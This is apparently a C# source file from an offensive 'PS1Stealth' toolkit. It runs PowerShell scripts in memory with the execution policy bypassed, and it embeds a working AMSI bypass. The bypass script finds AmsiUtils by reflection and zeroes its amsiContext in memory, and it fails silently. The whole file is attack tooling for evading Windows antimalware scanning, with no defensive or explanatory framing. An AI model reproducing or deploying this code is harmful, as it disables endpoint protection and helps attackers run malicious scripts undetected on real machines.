using System.Management.Automation;
using System.Management.Automation.Runspaces;
using PS1Stealth.Core;
using System.Text;

namespace PS1Stealth.Executors;

/// <summary>
/// Executes PowerShell scripts in-memory using System.Management.Automation
/// Includes AMSI bypass capabilities for Red Team operations
/// </summary>
public class PowerShellExecutor
{
    private bool _amsiBypassAttempted = false;

    public ExecutionResult ExecuteScript(string script)
    {
        var result = new ExecutionResult();

        try
        {
            // Create PowerShell runspace
            var initialSessionState = InitialSessionState.CreateDefault();
            initialSessionState.ExecutionPolicy = Microsoft.PowerShell.ExecutionPolicy.Bypass;

            using var runspace = RunspaceFactory.CreateRunspace(initialSessionState);
            runspace.Open();

            using var pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(script);
            
            // Execute and capture output
            var output = pipeline.Invoke();
            
            var outputBuilder = new StringBuilder();
            foreach (var item in output)
            {
                outputBuilder.AppendLine(item?.ToString() ?? "");
            }

            result.Output = outputBuilder.ToString();
            result.Success = true;

            // Capture errors if any
            if (pipeline.Error.Count > 0)
            {
                var errorBuilder = new StringBuilder();
                foreach (var error in pipeline.Error.ReadToEnd())
                {
                    errorBuilder.AppendLine(error?.ToString() ?? "");
                }
                result.Error = errorBuilder.ToString();
            }
        }
        catch (Exception ex)
        {
            result.Error = ex.Message;
            result.Success = false;
        }

        return result;
    }

    public void AttemptAMSIBypass()
    {
        if (_amsiBypassAttempted)
            return;

        _amsiBypassAttempted = true;

        try
        {
            var bypassScript = @"
                $a=[Ref].Assembly.GetTypes();
                Foreach($b in $a) {
                    if ($b.Name -like '*iUtils') {
                        $c=$b
                    }
                };
                $d=$c.GetFields('NonPublic,Static');
                Foreach($e in $d) {
                    if ($e.Name -like '*Context') {
                        $f=$e
                    }
                };
                $g=$f.GetValue($null);
                [IntPtr]$ptr=$g;
                [Int32[]]$buf=@(0);
                [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1);
            ";

            ExecuteScript(bypassScript);
        }
        catch
        {
            // Silent fail
        }
    }
}
